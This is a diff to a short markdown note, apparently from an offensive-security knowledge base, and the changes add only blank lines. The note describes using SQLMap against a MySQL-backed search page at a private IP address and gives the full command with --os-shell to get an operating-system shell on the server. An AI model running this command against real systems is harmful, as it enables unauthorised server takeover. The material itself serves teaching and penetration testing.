@@ -36,15 +36,29 @@ SQLMap is an automated SQL Injection exploitation tool. This can be used to inse
 
 *--dbms is used to specify the database type, --os-shell to specify the access for OS Shell*
 
+
+
 # Procedure
 
 1. The below SQLMap command can be used to get the OS shell of the server on which the application is running.
+
+
+
+
+
+
 
 **Command** ([[SQLMap Command to Get OS Shell]]):
 
 ```bash
 sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --os-shell
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -63,3 +77,5 @@ sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --os-shell
 - [[SQL Injection]]
 - [[SQLMap]]
 - [[Web Applications]]
+
+
